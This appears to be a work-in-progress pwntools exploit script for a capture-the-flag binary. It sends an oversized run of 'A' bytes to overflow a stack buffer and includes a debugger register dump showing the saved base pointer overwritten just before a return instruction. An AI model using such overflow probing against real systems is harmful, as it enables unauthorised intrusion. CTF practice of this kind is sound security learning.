from pwn import *

exe = ELF('./chall')

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *_read_and_print_str
        b *_read_and_print_str+47
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

rop = ROP(exe)
offset = 40

io.sendlineafter(b'>', str(1).encode())
io.sendlineafter(b'>', b'A' * 0x512)
io.interactive()


"""
                                                                                │──────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────
                                                                                │*RAX  0x1
                                                                                │ RBX  0x0
                                                                                │ RCX  0x5630c49e3036 (skip_determine_len+10) ◂— leave 
                                                                                │*RDX  0x1
                                                                                │ RDI  0x1
                                                                                │*RSI  0x7ffdac9fb3c8 ◂— 0x4141414141414141 ('AAAAAAAA')
                                                                                │ R8   0x0
                                                                                │ R9   0x0
                                                                                │ R10  0x2
                                                                                │ R11  0x202
                                                                                │ R12  0x5630c49e3118 (_start) ◂— lea rax, [rip + 0xee1]
                                                                                │ R13  0x7ffdac9fb5f0 ◂— 0x4141414141414141 ('AAAAAAAA')
                                                                                │ R14  0x0
                                                                                │ R15  0x0
                                                                                │*RBP  0x4141414141414141 ('AAAAAAAA')
                                                                                │ RSP  0x7ffdac9fb5d0 ◂— 0x4141414141414141 ('AAAAAAAA')
                                                                                │*RIP  0x5630c49e3067 (_read_and_print_str+47) ◂— ret 
"""